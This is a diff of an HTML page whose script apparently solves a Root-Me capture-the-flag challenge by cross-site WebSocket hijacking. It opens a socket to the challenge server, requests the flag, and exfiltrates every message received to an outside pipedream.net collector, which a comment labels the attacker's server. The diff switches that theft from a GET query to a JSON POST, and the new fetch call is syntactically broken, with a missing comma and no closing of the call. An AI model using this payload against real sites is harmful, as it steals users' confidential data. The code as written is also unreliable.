@@ -12,10 +12,15 @@
 	websocket = new WebSocket('ws://challenge01.root-me.org:58036/ws')
 	websocket.onopen = function () {
 	  websocket.send("hello");
+	  websocket.send("flag");
 	}
 	websocket.onmessage = function (event) {
 	  //Exfiltrate the confidential information to attackers server
-	  fetch('https://en9cw0xb6pcg6wl.m.pipedream.net/?'+event.data, {mode: 'no-cors'})
+	  fetch('https://en9cw0xb6pcg6wl.m.pipedream.net/', {
+	  	mode: 'no-cors'
+	  	method: 'POST',
+	  	headers: { 'Content-Type': 'application/json' },
+	  	body: JSON.stringify({ data: event.data }),
 	}	
 </script>
 </html>
